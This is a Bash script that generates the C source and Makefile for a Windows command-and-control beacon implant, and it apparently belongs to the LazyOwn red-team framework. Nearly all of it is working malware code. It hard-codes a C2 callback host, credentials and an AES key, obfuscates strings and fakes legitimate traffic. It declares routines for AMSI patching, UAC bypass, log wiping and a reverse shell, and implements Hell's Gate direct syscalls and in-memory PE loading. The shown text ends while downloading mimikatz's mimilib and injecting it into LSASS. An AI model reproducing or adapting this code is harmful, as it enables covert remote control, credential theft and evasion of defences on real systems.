#!/bin/bash

# === beacon-GEN v1.2 ===

set -euo pipefail

# === CONFIGURACIÓN ===
TARGET=""
URL="https://10.10.14.91:4444"
MALEABLE="/pleasesubscribe/v1/users/"
CLIENT_ID="windows"
C2_HOST="10.10.14.91"
C2_USER="LazyOwn"
C2_PASS="LazyOwn"
C2_PORT=4444
AES_KEY="36870130f03bf0bba5c8ed1d3e27117891ab415c5ea6cdbcb8731ef8fc218124"
USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
USER_AGENT1="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
USER_AGENT2="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
USER_AGENT3="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
OUTPUT="beacon.exe"
PROCESS_NAME="C:/Windows/System32/svchost.exe"
XOR_KEY_HEX="0x33"
XOR_KEY_DEC="51"
TIMEOUT=15
MAX_SIZE=2097152
BEACON="beacon.enc"
BACKUP="${OUTPUT}.bak"
# === LEER ARGUMENTOS ===
# Uso: script.sh [TARGET] [URL] [MALEABLE] [CLIENT_ID] ... [OUTPUT]
# Puedes pasar hasta 14 argumentos (todos los que tienes)

# === FUNCIONES ===
show_help() {
    echo "Uso: $0 [opciones]"
    echo ""
    echo "Opciones:"
    echo "  --target IP               Dirección IP objetivo (opcional)"
    echo "  --url URL                 URL base del C2 (por defecto: $URL)"
    echo "  --maleable PATH           Ruta maleable (por defecto: $MALEABLE)"
    echo "  --client-id ID            ID del cliente (por defecto: $CLIENT_ID)"
    echo "  --c2-host IP              Host del C2 (por defecto: $C2_HOST)"
    echo "  --c2-user USER            Usuario del C2 (por defecto: $C2_USER)"
    echo "  --c2-pass PASS            Contraseña del C2 (por defecto: $C2_PASS)"
    echo "  --c2-port PORT            Puerto del C2 (por defecto: $C2_PORT)"
    echo "  --aes-key HEX             Clave AES (por defecto: $AES_KEY)"
    echo "  --user-agent UA           User-Agent principal"
    echo "  --user-agent1 UA          User-Agent 1"
    echo "  --user-agent2 UA          User-Agent 2"
    echo "  --user-agent3 UA          User-Agent 3"
    echo "  --key                     0x33 Clave XOR en hexadecimal (por defecto: $XOR_KEY_HEX)"
    echo "  --output FILE             Nombre del archivo de salida (por defecto: $OUTPUT)"
    echo "  -h, --help                Muestra esta ayuda"
    echo "  Ejemplo:                  ./gen_beacon.sh --target 192.168.1.50 --url https://c2.ejemplo.com:8443 --maleable /api/v2/submit --client-id win10-pro --c2-host 192.168.1.10 --c2-user AdminC2 --c2-pass "P@ssw0rd_Secret_2025" --c2-port 8443 --aes-key aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899 --user-agent \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\" --user-agent1 \"Chrome/120.0.0.0 Safari/537.36\" --user-agent2 \"CustomAgent/1.0 (compatible)\" --user-agent3 "BotNet-X/2.5" --key 0x33 --output beacon_personalizado.exe"
    exit 0
}

# === PROCESAR ARGUMENTOS ===
while [[ $# -gt 0 ]]; do
    case $1 in
        --target)
            TARGET="$2"
            shift 2
            ;;
        --url)
            URL="$2"
            shift 2
            ;;
        --maleable)
            MALEABLE="$2"
            shift 2
            ;;
        --client-id)
            CLIENT_ID="$2"
            shift 2
            ;;
        --c2-host)
            C2_HOST="$2"
            shift 2
            ;;
        --c2-user)
            C2_USER="$2"
            shift 2
            ;;
        --c2-pass)
            C2_PASS="$2"
            shift 2
            ;;
        --c2-port)
            C2_PORT="$2"
            shift 2
            ;;
        --aes-key)
            AES_KEY="$2"
            shift 2
            ;;
        --user-agent)
            USER_AGENT="$2"
            shift 2
            ;;
        --user-agent1)
            USER_AGENT1="$2"
            shift 2
            ;;
        --user-agent2)
            USER_AGENT2="$2"
            shift 2
            ;;
        --user-agent3)
            USER_AGENT3="$2"
            shift 2
            ;;
        --key)
            XOR_KEY_HEX="$2"
            XOR_KEY_DEC=$(printf "%d" $XOR_KEY_HEX 2>/dev/null || echo "51")
            if ! [[ "$XOR_KEY_DEC" =~ ^[0-9]+$ ]]; then
                echo "[-] Invalid XOR key after conversion"
                exit 1
            fi
            shift 2
            ;;            
        --output)
            OUTPUT="$2"
            shift 2
            ;;
        -h|--help)
            show_help
            ;;
        *)
            echo "Error: opción desconocida: $1"
            echo "Usa --help para ver las opciones."
            exit 1
            ;;
    esac
done

# === XOR STRING TO BYTES ===
xor_string() {
    local str="$1"
    local key=$2
    local bytes=()
    for (( i=0; i<${#str}; i++ )); do
        local char="${str:$i:1}"
        local val=$(printf '%d' "'$char")
        bytes+=($(( val ^ key )))
    done
    local IFS=", "
    echo "${bytes[*]}"
}

# Generar arrays ofuscados
OBF_URL_BYTES=$(xor_string "$URL" $XOR_KEY_DEC)
OBF_PROC_BYTES=$(xor_string "$PROCESS_NAME" $XOR_KEY_DEC)
OBF_UA_BYTES=$(xor_string "$USER_AGENT" $XOR_KEY_DEC)

# === MOSTRAR CONFIGURACIÓN FINAL ===
echo "=== CONFIGURACIÓN ACTUAL ==="
echo "TARGET: $TARGET"
echo "URL: $URL"
echo "MALEABLE: $MALEABLE"
echo "CLIENT_ID: $CLIENT_ID"
echo "C2_HOST: $C2_HOST"
echo "C2_USER: $C2_USER"
echo "C2_PASS: $C2_PASS"
echo "C2_PORT: $C2_PORT"
echo "AES_KEY: $AES_KEY"
echo "USER_AGENT: $USER_AGENT"
echo "USER_AGENT1: $USER_AGENT1"
echo "USER_AGENT2: $USER_AGENT2"
echo "USER_AGENT3: $USER_AGENT3"
echo "KEY: $XOR_KEY_HEX"
echo "OUTPUT: $OUTPUT"

# === GENERAR Makefile ===
cat > Makefile << EOF
.PHONY: windows clean upx
windows: beacon.c
	x86_64-w64-mingw32-gcc beacon.c aes.c cJSON.c -o $OUTPUT -lwinhttp -lcrypt32 -lws2_32 -liphlpapi -lbcrypt -lshlwapi -lrpcrt4 -DUNICODE -D_UNICODE 
clean:
	#rm -f $OUTPUT beacon.c
upx:
	upx --best --ultra-brute $OUTPUT
EOF

cat > beacon.c << EOF
#define PSAPI_VERSION 2
#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <winnt.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <ntstatus.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <io.h>
#include <process.h>
#include <time.h>
#include <iphlpapi.h>
#include <icmpapi.h>
#include <bcrypt.h>
#include <shlobj.h>
#include <objbase.h>
#include <shellapi.h>
#include <winioctl.h>
#include <setjmp.h>

#include "aes.h"
#include "cJSON.h"

#pragma warning(disable: 4005)
#pragma comment(lib, "secur32.lib")
#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "icmpapi.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "user32.lib")
// =================================================================================================
// CONFIGURACIÓN
// =================================================================================================

// === OFUSCACIÓN DE STRINGS ===
unsigned char OBF_TARGET_PROCESS[] = { $OBF_PROC_BYTES, 0 };
unsigned char OBF_USER_AGENT[] = { $OBF_UA_BYTES, 0 };

// === CONFIGURACIÓN ===
#define XOR_KEY $XOR_KEY_HEX
#define DEBUG
#define TIMEOUT $TIMEOUT
#define MAX_RESPONSE_SIZE $MAX_SIZE
#define C2_URL "$URL"
#define MALEABLE "$MALEABLE"
#define CLIENT_ID "$CLIENT_ID"
#define SLEEP_BASE 6000  // ms
#define MIN_JITTER 30    // 30%
#define MAX_JITTER 60    // 60%
#define MAX_RETRIES 3
#define C2_HOST "$C2_HOST"
#define LC2_HOST L"$C2_HOST"
#define C2_USER "$C2_USER"
#define C2_PASS "$C2_PASS"
#define C2_PORT $C2_PORT
#define CONFIG_PATH L"/config.json"
#define C2_PATH "$MALEABLE$CLIENT_ID"
#define LC2_PATH L"$MALEABLE$CLIENT_ID"
#ifndef min
#define min(a,b) (((a) < (b)) ? (a) : (b))
#endif
#ifndef SECURITY_FLAG_IGNORE_REVOCATION
#define SECURITY_FLAG_IGNORE_REVOCATION 0x00000080
#endif
#ifndef INVALID_SOCKET
#define INVALID_SOCKET (SOCKET)(~0)
#endif
#define USER_AGENT  L"$USER_AGENT"
#define USER_AGENT_A "$USER_AGENT"
#define IMAGE_DOS_SIGNATURE 0x5A4D
#define IMAGE_NT_SIGNATURE 0x00004550
#define IMAGE_NT_OPTIONAL_HDR32_MAGIC 0x10b
#define IMAGE_NT_OPTIONAL_HDR64_MAGIC 0x20b
#ifndef SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE
#define SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE 0x00000010
#endif
#ifndef SECURITY_FLAG_IGNORE_INVALID_POLICY
#define SECURITY_FLAG_IGNORE_INVALID_POLICY   0x00000020
#endif
#ifndef _SECURITY_PACKAGE_DEFINITION_
#define _SECURITY_PACKAGE_DEFINITION_
#endif 
#ifndef _PROCESS_BASIC_INFORMATION_
#define _PROCESS_BASIC_INFORMATION_
#ifndef _SP_LSA_MODE_INITIALIZE_DEFINED_
#define _SP_LSA_MODE_INITIALIZE_DEFINED_

#endif

// Also define the ProcessInformationClass constant if not present
#ifndef ProcessBasicInformation
#define ProcessBasicInformation 0
#endif

#define CHECK_ERROR(cond, msg) \
    do { \
        if (!(cond)) { \
            printf("[-] %s: %lu\n", msg, GetLastError()); \
            return FALSE; \
        } \
    } while(0)


typedef struct _PROCESS_BASIC_INFORMATION {
    LONG ExitStatus;
    PVOID PebBaseAddress;
    ULONG_PTR AffinityMask;
    LONG BasePriority;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION, *PPROCESS_BASIC_INFORMATION;


typedef struct {
    SOCKET client;
    SOCKET server;
    BOOL active;
    char listenIP[16];
    int listenPort;
} ProxySession;

typedef struct {
    SOCKET client;
    char listenIP[16];
    int listenPort;
    char targetIP[16];
    int targetPort;
    ProxySession* session;
} ProxyThreadData;

typedef struct {
    char host[32];
    int port;
} ReverseArgs;

typedef struct {
    char targetIP[32];
    int ports[64];
    int numPorts;
} PortScannerArgs;


typedef struct {
    int reverse_shell_port;
    char rhost[256];
    char debug_implant[32];
    int ports[64];
    int num_ports;
} LazyDataType;

typedef struct {
    SOCKET listenSocket;
    BOOL running;
    char listenIP[16];
    int listenPort;
    char targetIP[16];
    int targetPort;
} ProxyListener;


LazyDataType lazyconf;

// Definitions
static CRITICAL_SECTION proxyMutex;
static ProxySession proxySessions[100];
static int numProxySessions = 0;

static ProxyListener proxyListeners[10];
static int numProxyListeners = 0;
static BOOL proxyInitialized = FALSE;

// === FIRMA DE SpLsaModeInitialize (MinGW compatible) ===

typedef NTSTATUS (NTAPI *SpLsaModeInitialize_t)(
    ULONG LsaVersion,
    PULONG PackageVersion,
    void** ppTables,      
    PULONG pcTables
);

#endif // _SECURITY_PACKAGE_DEFINITION_

// === DEFINICIÓN DE SpLsaModeInitialize (firma estándar) ===
#ifndef SECURITY_KERNEL
typedef NTSTATUS (NTAPI *PSECPKG_KERNEL_FUNCTION)(
    PVOID PackageContext,
    PVOID Argument1,
    PVOID Argument2
);
#endif


// Clave AES-256 en bytes
const char* aes_key_hex = "$AES_KEY";

BYTE aes_key[32];


// User-Agents (como en tu Go)
const char* USER_AGENTS[] = {
    "$USER_AGENT",
    "$USER_AGENT1",
    "$USER_AGENT2",
    "$USER_AGENT3"
};
#define NUM_USER_AGENTS 4

// URLs y User-Agents legítimos (como en tu Go)
const char* TRAFFIC_URLS[] = {
    "https://grisuno.github.io/LazyOwn",
    "https://github.com/grisuno/LazyOwn",
    "https://github.com/grisuno/LazyOwnBT",
    "https://github.com/grisuno/ShadowLink"
};
#define NUM_URLS 4

const char* TRAFFIC_UAS[] = {
    "$USER_AGENT",
    "$USER_AGENT1",
    "$USER_AGENT2"
};
#define NUM_UAS 3

// =================================================================================================
// NTAPI Definitions
// =================================================================================================
static jmp_buf exceptionJump;
static LONG WINAPI ExceptionFilter(EXCEPTION_POINTERS *ExceptionInfo) {
    // Si es una violación de acceso
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
        longjmp(exceptionJump, 1);
    }
    return EXCEPTION_EXECUTE_HANDLER;
}

// === ESTRUCTURAS NECESARIAS (MinGW-safe) ===
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA {
    DWORD Length;
    DWORD Initialized;
    PVOID SsHandle;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    LIST_ENTRY InLoadOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PPEB_LDR_DATA Ldr;
} PEB, *PPEB;

#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

typedef VOID (NTAPI *PAPCFUNC)(ULONG_PTR);
typedef LONG NTSTATUS;

typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI *NtWriteVirtualMemory_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS (NTAPI *NtQueueApcThread_t)(HANDLE, PAPCFUNC, PVOID, PVOID, PVOID);
// Necessario para NtQueryInformationProcess
typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(
    HANDLE ProcessHandle,
    ULONG ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

// Necessario para RtlAdjustPrivilege
typedef NTSTATUS (NTAPI *pRtlAdjustPrivilege)(
    ULONG Privilege,
    BOOLEAN Enable,
    BOOLEAN CurrentThread,
    PBOOLEAN Enabled
);
// Estructura para almacenar el contexto de cifrado
struct AES_ctx aes_ctx;
BYTE iv[16];
int ports[] = {80, 443, 22, 21}; 
typedef struct {
    uint8_t Key[32];
    int Valid;
    int Enabled;
} PacketEncryptionContext;

const char* get_shell_cmd() {
    return "cmd.exe";
}

// Variables globales (deben estar definidas en otro lado)

static const char* b64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

typedef struct {
    char ip[16];
    int port;
    BOOL open;
} PortResult;


// Variables globales
int stealthModeEnabled = 0;  
int iamgroot = 0;
// discoverLocalHosts.c
char* portScanResults = NULL;
char* discoveredLiveHosts = NULL;
char* result_pwd = NULL;

char* id_atomic;
char* output;
char* error;
char* hostname;
char* ips;
char* user;
char* command;


// ========================
// DECLARACIONES DE FUNCIONES 
// ========================

char* GetIPs();
char* GetHostname();
char* GetUsername();

void overWrite(const char* targetPath, const char* payloadPath);
BOOL EarlyBirdInject(unsigned char* shellcode, int shellcode_len);
BOOL DownloadFromURL(const char* url, const char* filepath);
BOOL handleUpload(const char* command);
char* exec_cmd(const char* cmd);
char* retry_http_request(const char* url, const char* method, const char* data, int max_retries);
BOOL isVMByMAC();
char* GetUsefulSoftware();
void discoverLocalHosts();
BOOL patchAMSI(void);
void tryPrivilegeEscalation();
BOOL checkDebuggers();
BOOL isSandboxEnvironment();
BOOL executeUACBypass(const char* payloadPath);
void obfuscateFileTimestamps(const char* basePath, int depth);
void cleanSystemLogs();
void restartClient();
void selfDestruct();
BOOL startProxy(const char* listenAddr, const char* targetAddr);
void simulateLegitimateTraffic();
void PortScanner(char* targetIP, int* ports, int numPorts);
char* encrypt_data(const char* data);
char* base64_encode(const unsigned char* data, size_t inputLen);
wchar_t* UTF8ToWide(const char* utf8);
void scanPort(void* arg);
BOOL isValidUUID(const char* uuid);
unsigned char* DownloadToBuffer(const char* url, DWORD* fileSize);
BOOL is_64bit(BYTE* buffer);
BOOL FileExistsA(const char* filePath);
HMODULE MapDllNameToModule(char* dllName);
void ExecuteTLSCallbacks(PVOID moduleBase);
PVOID MapModuleToMemory(unsigned char* fileBuffer, DWORD fileSize);
BOOL ExecuteModule(PVOID moduleBase);
void __cdecl ReverseShell(void* arg);
void cleanupProxy();
BOOL anti_analysis(void);
HMODULE GetNtdllBase(void);


// === HELL'S GATE + HELLDESCENT ===
static volatile DWORD __syscall_ssn = 0;
typedef NTSTATUS (NTAPI *SpLsaModeInitialize_t)(ULONG, PULONG, void**, PULONG);
// === MAP DLL NAME TO REAL DLL ===
HMODULE MapDllNameToModule(char* dllName) {
    if (strstr(dllName, "api-ms-win-crt")) {
        return GetModuleHandleA("ucrtbase.dll");
    }
    if (strstr(dllName, "api-ms-win-core")) {
        return GetModuleHandleA("kernel32.dll");
    }
    if (strstr(dllName, "api-ms-win-security")) {
        return GetModuleHandleA("advapi32.dll");
    }
    if (strstr(dllName, "api-ms-win-sspi")) {
        return GetModuleHandleA("secur32.dll");
    }
    if (strstr(dllName, "KERBEROS")) {
        return GetModuleHandleA("SECUR32.DLL");
    }
    if (strstr(dllName, "RPCRT4")) {
        return GetModuleHandleA("RPCRT4.DLL");
    }
    if (strstr(dllName, "CRYPT32")) {
        return GetModuleHandleA("CRYPT32.DLL");
    }
    if (strstr(dllName, "ADVAPI32")) {
        return GetModuleHandleA("ADVAPI32.DLL");
    }
    return LoadLibraryA(dllName);
}

DWORD GetSyscallNumber(PVOID func_addr) {
    if (!func_addr) return 0;
    BYTE* addr = (BYTE*)func_addr;
    for (int i = 0; i < 32; i++) {
        if (addr[i] == 0xB8) {
            return *(DWORD*)(addr + i + 1) & 0xFFFF;
        }
        if (addr[i] == 0xC3) break;
    }
    return 0;
}

DWORD HellsGate(DWORD ssn) {
    __syscall_ssn = ssn;
    return ssn;
}

__attribute__((naked))
NTSTATUS HellDescent(
    DWORD64 arg1, DWORD64 arg2, DWORD64 arg3,
    DWORD64 arg4, DWORD64 arg5, DWORD64 arg6
) {
    __asm__ volatile (
        "movq %%rcx, %%r10\n\t"
        "movl __syscall_ssn(%%rip), %%eax\n\t"
        "syscall\n\t"
        "ret\n\t"
        :
        :
        : "rax", "r10", "rcx"
    );
}

DWORD GetProcessIdByName(const char* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe = {0};
    pe.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hSnapshot, &pe)) {
        do {
            if (lstrcmpiW(pe.szExeFile, TEXT("lsass.exe")) == 0){
                CloseHandle(hSnapshot);
                return pe.th32ProcessID;
            }
        } while (Process32NextW(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    return 0;
}
// === EJECUTAR TLS CALLBACKS ===
void ExecuteTLSCallbacks(PVOID moduleBase) {
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)moduleBase;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((BYTE*)moduleBase + dos->e_lfanew);
    
    IMAGE_DATA_DIRECTORY* tlsDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    if (tlsDir->Size == 0 || !tlsDir->VirtualAddress) return;

    IMAGE_TLS_DIRECTORY* tls = (IMAGE_TLS_DIRECTORY*)((BYTE*)moduleBase + tlsDir->VirtualAddress);
    if (!tls->AddressOfCallBacks) return;

    PIMAGE_TLS_CALLBACK* callbacks = (PIMAGE_TLS_CALLBACK*)tls->AddressOfCallBacks;
    for (DWORD i = 0; callbacks[i]; i++) {
        callbacks[i](moduleBase, DLL_PROCESS_ATTACH, NULL);
    }
}

// === Carga un módulo en memoria ===
PVOID MapModuleToMemory(unsigned char* fileBuffer, DWORD fileSize) {
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)fileBuffer;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(fileBuffer + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return NULL;

    DWORD imageSize = ntHeaders->OptionalHeader.SizeOfImage;
    PVOID baseAddress = VirtualAlloc(NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!baseAddress) return NULL;

    // Copiar cabeceras
    memcpy(baseAddress, fileBuffer, ntHeaders->OptionalHeader.SizeOfHeaders);

    // Copiar secciones
    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(ntHeaders);
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (sections[i].PointerToRawData && sections[i].SizeOfRawData) {
            memcpy((BYTE*)baseAddress + sections[i].VirtualAddress,
                   fileBuffer + sections[i].PointerToRawData,
                   sections[i].SizeOfRawData);
        }
    }

    // Reubicaciones
    IMAGE_DATA_DIRECTORY* relocDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (relocDir->Size > 0 && relocDir->VirtualAddress > 0) {
        BYTE* reloc = (BYTE*)baseAddress + relocDir->VirtualAddress;
        BYTE* relocEnd = reloc + relocDir->Size;

        while (reloc < relocEnd && *(DWORD*)reloc) {
            IMAGE_BASE_RELOCATION* block = (IMAGE_BASE_RELOCATION*)reloc;
            if (block->SizeOfBlock < sizeof(IMAGE_BASE_RELOCATION)) break;

            DWORD count = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2;
            WORD* entry = (WORD*)(block + 1);

            for (DWORD i = 0; i < count; i++) {
                if ((entry[i] & 0xF000) == 0x3000) {
                    DWORD_PTR* patchAddr = (DWORD_PTR*)((BYTE*)baseAddress + block->VirtualAddress + (entry[i] & 0x0FFF));
                    *patchAddr += (DWORD_PTR)baseAddress - ntHeaders->OptionalHeader.ImageBase;
                }
            }
            reloc += block->SizeOfBlock;
        }
    }

    // Resolver IAT
    IMAGE_DATA_DIRECTORY* importDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDir->Size > 0 && importDir->VirtualAddress > 0) {
        IMAGE_IMPORT_DESCRIPTOR* importDesc = (IMAGE_IMPORT_DESCRIPTOR*)((BYTE*)baseAddress + importDir->VirtualAddress);

        for (; importDesc->Name; importDesc++) {
            char* dllName = (char*)((BYTE*)baseAddress + importDesc->Name);
            printf("[I] Cargando DLL: %s\n", dllName);
            fflush(stdout);

            HMODULE hDll = MapDllNameToModule(dllName);
            if (!hDll) {
                printf("[-] No se pudo cargar: %s\n", dllName);
                fflush(stdout);
                VirtualFree(baseAddress, 0, MEM_RELEASE);
                return NULL;
            }

            IMAGE_THUNK_DATA* origThunk = (IMAGE_THUNK_DATA*)((BYTE*)baseAddress + importDesc->OriginalFirstThunk);
            IMAGE_THUNK_DATA* firstThunk = (IMAGE_THUNK_DATA*)((BYTE*)baseAddress + importDesc->FirstThunk);

            if (!origThunk || !firstThunk) continue;

            for (; origThunk->u1.AddressOfData; origThunk++, firstThunk++) {
                if (origThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                    firstThunk->u1.Function = (ULONG_PTR)GetProcAddress(hDll, (LPCSTR)(origThunk->u1.Ordinal & 0xFFFF));
                } else {
                    IMAGE_IMPORT_BY_NAME* import = (IMAGE_IMPORT_BY_NAME*)((BYTE*)baseAddress + origThunk->u1.AddressOfData);
                    firstThunk->u1.Function = (ULONG_PTR)GetProcAddress(hDll, (LPCSTR)import->Name);
                }
                if (!firstThunk->u1.Function) {
                    printf("[-] ADVERTENCIA: No resuelto: %s!%p\n", dllName, (void*)origThunk->u1.AddressOfData);
                    fflush(stdout);
                }
            }
        }
    }

    return baseAddress;
}

// === Ejecuta el módulo (DllMain o EntryPoint) ===
BOOL ExecuteModule(PVOID moduleBase) {
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)moduleBase;
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)moduleBase + dosHeader->e_lfanew);

    if (ntHeaders->OptionalHeader.AddressOfEntryPoint == 0) {
        return TRUE;
    }

    PVOID entryPoint = (BYTE*)moduleBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;

    // ✅ Ejecutar TLS callbacks antes de cualquier cosa
    ExecuteTLSCallbacks(moduleBase);

    // === CASO 1: Tiene DllMain (DLL normal) ===
    if (ntHeaders->FileHeader.Characteristics & IMAGE_FILE_DLL) {
        typedef BOOL (WINAPI *DllMain_t)(HINSTANCE, DWORD, LPVOID);
        DllMain_t DllMain = (DllMain_t)entryPoint;

        // 🔁 Primero: intentar DllMain
        if (DllMain((HINSTANCE)moduleBase, DLL_PROCESS_ATTACH, NULL)) {
            printf("[+] DllMain ejecutado exitosamente\n");
            fflush(stdout);
            return TRUE;
        } else {
            printf("[-] DllMain devolvió FALSE → probando entry point...\n");
            fflush(stdout);
        }
    }

    // === CASO 2: Si DllMain falló o no es DLL, ejecutar entry point directamente ===
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)entryPoint, NULL, 0, NULL);
    if (hThread) {
        printf("[+] EntryPoint ejecutado en hilo\n");
        fflush(stdout);
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
        return TRUE;
    }

    printf("[-] Fallo al ejecutar EntryPoint\n");
    fflush(stdout);
    return FALSE;
}

// === Carga y ejecuta un módulo desde URL ===
BOOL LoadModuleFromURL(const char* url) {
    printf("[*] Cargando módulo desde: %s\n", url);
    fflush(stdout);

    // === ¿Es mimilib.dll? → inyectar en LSASS vía LoadLibraryA ===
    if (strstr(url, "mimilib.dll") || strstr(url, "mimikatz")) {
        printf("[*] Módulo especial detectado: inyectando en LSASS\n");
        fflush(stdout);

        // --- 1. Anti-análisis ---
        if (anti_analysis()) {
            printf("[-] Entorno de análisis detectado\n");
            fflush(stdout);
            return FALSE;
        }

        // --- 2. Buscar PID de LSASS ---
        DWORD lsassPid = GetProcessIdByName("lsass.exe");
        if (lsassPid == 0) {
            printf("[-] No se encontró LSASS\n");
            fflush(stdout);
            return FALSE;
        }

        printf("[+] LSASS encontrado: PID=%lu\n", lsassPid);
        fflush(stdout);

        // --- 3. Descargar DLL a disco temporal ---
        char tempPath[MAX_PATH];
        GetTempPathA(MAX_PATH, tempPath);
        strcat_s(tempPath, MAX_PATH, "mimilib.dll");

        DWORD fileSize = 0;
        unsigned char* dllBuffer = DownloadToBuffer(url, &fileSize);
        if (!dllBuffer || fileSize == 0) {
            printf("[-] Fallo al descargar DLL\n");
            return FALSE;
        }

        HANDLE hFile = CreateFileA(tempPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            printf("[-] No se pudo crear archivo temporal\n");
            free(dllBuffer);
            return FALSE;
        }

        DWORD written;
        WriteFile(hFile, dllBuffer, fileSize, &written, NULL);
        CloseHandle(hFile);
        free(dllBuffer);

        printf("[+] DLL guardada en: %s\n", tempPath);
        fflush(stdout);

        // --- 4. Abrir proceso LSASS ---
        HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, lsassPid);
        if (!hProcess) {
            printf("[-] No se pudo abrir LSASS (¿PPL activo?)\n");
            fflush(stdout);
            return FALSE;
        }

        // --- 5. Alocar memoria para la ruta ---
        LPVOID pRemotePath = VirtualAllocEx(hProcess, NULL, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!pRemotePath) {
            printf("[-] VirtualAllocEx falló\n");
            CloseHandle(hProcess);
            return FALSE;
        }

        // --- 6. Escribir ruta en memoria remota ---
        if (!WriteProcessMemory(hProcess, pRemotePath, tempPath, strlen(tempPath) + 1, NULL)) {
            printf("[-] WriteProcessMemory falló (ruta)\n");
            VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return FALSE;
        }

        // --- 7. Obtener LoadLibraryA ---
        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
        if (!hKernel32) {
            printf("[-] No se pudo obtener kernel32.dll\n");
            VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return FALSE;
        }

        PVOID pLoadLibraryA = GetProcAddress(hKernel32, "LoadLibraryA");
        if (!pLoadLibraryA) {
            printf("[-] No se pudo obtener LoadLibraryA\n");
